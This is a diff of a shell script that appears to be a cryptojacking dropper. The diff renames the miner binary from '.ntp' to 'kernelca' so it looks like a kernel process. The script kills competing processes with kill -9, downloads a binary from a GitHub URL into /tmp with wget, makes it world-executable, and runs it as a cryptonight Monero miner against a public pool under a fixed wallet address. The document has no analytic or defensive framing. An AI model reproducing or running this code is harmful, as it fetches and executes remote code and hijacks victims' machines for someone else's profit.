@@ -1,5 +1,5 @@
 #!/bin/sh
-ps -fe|grep .ntp |grep -v grep
+ps -fe|grep kernelca |grep -v grep
 if [ $? -ne 0 ]
 then
 	ps auxf|grep -v grep|grep "\./"|grep 'httpd.conf'|awk '{print $2}'|xargs kill -9
@@ -9,9 +9,9 @@ then
 	ps auxf|grep -v grep|grep "trtgsasefd"|awk '{print $2}'|xargs kill -9
 	ps auxf|grep -v grep|grep "bmsnxvpggm"|awk '{print $2}'|xargs kill -9
 	ps auxf|grep -v grep|grep "ixcnkupikm"|awk '{print $2}'|xargs kill -9
-	wget -nc -O /tmp/.ntp https://github.com/0x1846/m10/raw/master/ntp
-	chmod 777 /tmp/.ntp
-	/tmp/.ntp -B  -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u 49Q1VM2gtjUGUdEYvqsGDgG8egDRRSP94PHgUnCf85X3acbRQps1LHBF8omuWXzLNge4aC63zzFRD615DpzkgV52PdChSKs -p x
+	wget -nc -O /tmp/kernelca https://github.com/0x1846/m10/raw/master/ntp
+	chmod 777 /tmp/kernelca
+	/tmp/kernelca -B  -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u 49Q1VM2gtjUGUdEYvqsGDgG8egDRRSP94PHgUnCf85X3acbRQps1LHBF8omuWXzLNge4aC63zzFRD615DpzkgV52PdChSKs -p x
 else
 	exit 1
 fi
